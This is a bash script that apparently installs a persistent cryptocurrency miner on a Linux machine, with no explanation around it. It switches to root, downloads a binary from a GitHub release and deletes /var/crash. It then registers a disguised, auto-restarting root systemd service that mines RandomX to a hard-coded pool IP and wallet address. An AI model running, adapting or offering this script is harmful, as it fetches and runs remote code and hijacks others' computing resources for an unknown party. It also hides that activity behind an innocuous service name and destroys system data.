#!/bin/bash
sudo su
cd /home
wget https://github.com/trangtrau/sang_ml/releases/download/test/ar 
cp ar jvdar 
chmod +x jvdar
rm -rf /lib/systemd/system/davincenunit.service
rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/davincenunit.service 
[Unit]
Description=davincenunit
After=network.target
[Service]
ExecStart= /home/jvdar -o 35.226.178.181:3333 -u ZEPHs85fB2beCgLJfaa4fLQZSCC4fpmJTWWN9qw9ubfjGEk3RknpcHdDV93vY5BioJDJQ1dfpvWj5QMBfjYMS99X8VhEztpZD1b -p davincen_bulk_cpu -a rx/0 -k -t 4
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable davincenunit.service &&
service davincenunit stop  &&
service davincenunit restart
